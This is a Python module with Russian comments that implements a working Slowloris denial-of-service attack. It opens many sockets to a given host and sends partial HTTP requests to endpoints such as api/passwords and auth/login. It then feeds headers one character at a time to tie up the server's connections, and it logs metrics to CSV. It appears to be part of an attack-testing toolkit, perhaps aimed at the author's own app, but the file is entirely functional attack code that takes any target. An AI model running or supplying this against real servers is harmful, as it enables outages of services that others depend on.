import socket
import threading
import time
import random
import os
from colorama import Fore, Style, init
from utils.metrics import metrics_collector
from utils.test_data import test_data_generator

# Инициализация colorama для цветного вывода
init(autoreset=True)

class SlowlorisAttack:
    """Класс для выполнения Slowloris атаки"""
    
    def __init__(self, target_host: str, target_port: int = 8080, connections: int = 200, duration: int = 300):
        self.target_host = target_host
        self.target_port = target_port
        self.connections = connections
        self.duration = duration  # продолжительность в секундах
        self.running = False
        self.sockets = []
        self.successful_connections = 0
        self.failed_connections = 0
        
        # Список заголовков для медленной отправки
        self.headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-us,en;q=0.5",
            "Accept-Encoding: gzip,deflate",
            "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7",
            "Cache-Control: no-cache",
            "Connection: keep-alive"
        ]
    
    def create_socket(self):
        """Создает новое сокетное соединение"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target_host, self.target_port))
            
            # Отправляем начальную строку HTTP запроса
            initial_request = f"GET /{random.choice(['auth/health', 'api/passwords', 'api/notes', 'auth/login'])} HTTP/1.1\r\n"
            sock.send(initial_request.encode('utf-8'))
            
            # Отправляем Host заголовок
            host_header = f"Host: {self.target_host}:{self.target_port}\r\n"
            sock.send(host_header.encode('utf-8'))
            
            return sock
            
        except Exception as e:
            return None
    
    def send_header_slowly(self, sock, header):
        """Отправляет заголовок медленно, по одному символу"""
        try:
            for char in header + "\r\n":
                sock.send(char.encode('utf-8'))
                time.sleep(random.uniform(0.01, 0.1))  # Случайная задержка
            return True
        except:
            return False
    
    def keep_connection_alive(self, sock_id):
        """Поддерживает соединение активным, отправляя заголовки медленно"""
        start_time = time.time()
        header_index = 0
        
        while self.running and (time.time() - start_time) < self.duration:
            try:
                if sock_id >= len(self.sockets) or not self.sockets[sock_id]:
                    break
                
                sock = self.sockets[sock_id]
                
                # Выбираем случайный заголовок
                if header_index >= len(self.headers):
                    header_index = 0
                
                header = self.headers[header_index]
                
                # Отправляем заголовок медленно
                if self.send_header_slowly(sock, header):
                    print(f"{Fore.GREEN}📡 [{sock_id}] Отправлен заголовок: {header[:30]}...")
                    
                    # Записываем метрику
                    metrics_collector.add_metric(
                        response_time=time.time() - start_time,
                        status_code=200,  # Условно успешный
                        size=len(header),
                        attack_type="SLOWLORIS",
                        endpoint="slow_connection"
                    )
                else:
                    print(f"{Fore.RED}❌ [{sock_id}] Не удалось отправить заголовок")
                    break
                
                header_index += 1
                
                # Случайная пауза между заголовками
                time.sleep(random.uniform(5, 15))
                
            except Exception as e:
                print(f"{Fore.RED}💥 [{sock_id}] Ошибка соединения: {str(e)}")
                break
        
        # Закрываем соединение
        try:
            if sock_id < len(self.sockets) and self.sockets[sock_id]:
                self.sockets[sock_id].close()
                self.sockets[sock_id] = None
                print(f"{Fore.BLUE}🔒 [{sock_id}] Соединение закрыто")
        except:
            pass
    
    def establish_connections(self):
        """Устанавливает первоначальные соединения"""
        print(f"{Fore.YELLOW}🔗 Установка {self.connections} соединений...")
        
        self.sockets = [None] * self.connections
        
        for i in range(self.connections):
            if not self.running:
                break
                
            sock = self.create_socket()
            if sock:
                self.sockets[i] = sock
                self.successful_connections += 1
                print(f"{Fore.GREEN}✅ Соединение {i+1}/{self.connections} установлено")
            else:
                self.failed_connections += 1
                print(f"{Fore.RED}❌ Не удалось установить соединение {i+1}")
            
            # Небольшая задержка между соединениями
            time.sleep(random.uniform(0.1, 0.5))
        
        print(f"{Fore.CYAN}📊 Установлено соединений: {self.successful_connections}/{self.connections}")
    
    def run(self):
        """Запуск Slowloris атаки"""
        print(f"\n{Fore.RED}{'='*60}")
        print(f"{Fore.RED}🐌 ЗАПУСК SLOWLORIS АТАКИ")
        print(f"{Fore.RED}{'='*60}")
        print(f"{Fore.WHITE}Цель: {self.target_host}:{self.target_port}")
        print(f"{Fore.WHITE}Соединений: {self.connections}")
        print(f"{Fore.WHITE}Продолжительность: {self.duration} секунд")
        print(f"{Fore.WHITE}Стратегия: Медленная отправка HTTP заголовков")
        print(f"{Fore.RED}{'='*60}")
        
        # Очищаем предыдущие метрики
        metrics_collector.clear()
        
        self.running = True
        self.successful_connections = 0
        self.failed_connections = 0
        
        start_time = time.time()
        
        # Устанавливаем соединения
        self.establish_connections()
        
        if self.successful_connections == 0:
            print(f"{Fore.RED}❌ Не удалось установить ни одного соединения!")
            return None
        
        # Запускаем потоки для поддержания соединений
        threads = []
        for i in range(self.successful_connections):
            if self.sockets[i]:
                thread = threading.Thread(target=self.keep_connection_alive, args=(i,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
        
        try:
            # Ждем завершения времени атаки
            time.sleep(self.duration)
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⏹️  Атака прервана пользователем")
        finally:
            self.running = False
        
        # Ждем завершения всех потоков
        print(f"{Fore.YELLOW}⏳ Завершение соединений...")
        for thread in threads:
            thread.join(timeout=5)
        
        # Закрываем оставшиеся соединения
        for i, sock in enumerate(self.sockets):
            if sock:
                try:
                    sock.close()
                    print(f"{Fore.BLUE}🔒 Соединение {i} принудительно закрыто")
                except:
                    pass
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Выводим итоговую статистику
        print(f"\n{Fore.RED}{'='*60}")
        print(f"{Fore.RED}📊 РЕЗУЛЬТАТЫ SLOWLORIS АТАКИ")
        print(f"{Fore.RED}{'='*60}")
        print(f"{Fore.WHITE}Время выполнения: {duration:.2f} секунд")
        print(f"{Fore.GREEN}Успешных соединений: {self.successful_connections}")
        print(f"{Fore.RED}Неудачных соединений: {self.failed_connections}")
        
        if self.successful_connections > 0:
            print(f"{Fore.YELLOW}Среднее время удержания соединения: {duration:.2f}с")
        
        print(f"{Fore.RED}{'='*60}")
        
        # Сохраняем метрики
        timestamp = int(time.time())
        csv_filename = f"metrics/slowloris_{timestamp}.csv"
        
        # Добавляем финальную метрику с общими результатами
        metrics_collector.add_metric(
            response_time=duration,
            status_code=200 if self.successful_connections > 0 else 0,
            size=self.successful_connections,
            attack_type="SLOWLORIS",
            endpoint="attack_summary"
        )
        
        metrics_collector.save_to_csv(csv_filename)
        metrics_collector.print_stats()
        
        return csv_filename


def run(target_url: str, connections: int = 200, duration: int = 300):
    """Функция для запуска Slowloris атаки (совместимость с меню)"""
    # Извлекаем хост и порт из URL
    if "://" in target_url:
        target_url = target_url.split("://")[1]
    
    if ":" in target_url:
        host, port = target_url.split(":")
        port = int(port)
    else:
        host = target_url
        port = 80
    
    attack = SlowlorisAttack(host, port, connections, duration)
    return attack.run() 